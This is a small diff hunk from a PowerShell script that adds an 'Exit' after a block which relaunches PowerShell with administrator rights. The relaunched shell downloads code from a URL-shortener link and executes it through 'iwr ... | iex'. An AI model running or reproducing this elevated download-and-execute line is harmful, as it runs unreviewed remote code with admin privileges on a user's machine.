@@ -25,6 +25,7 @@ if ($host.Name -ne "ConsoleHost") {
         [System.Windows.Forms.MessageBoxIcon]::Warning
     )
     Start-Process PowerShell -ArgumentList "-Command ""iwr 'https://shorturl.at/nQ7Q8' | iex""" -Verb RunAs
+    Exit
 }
 
 
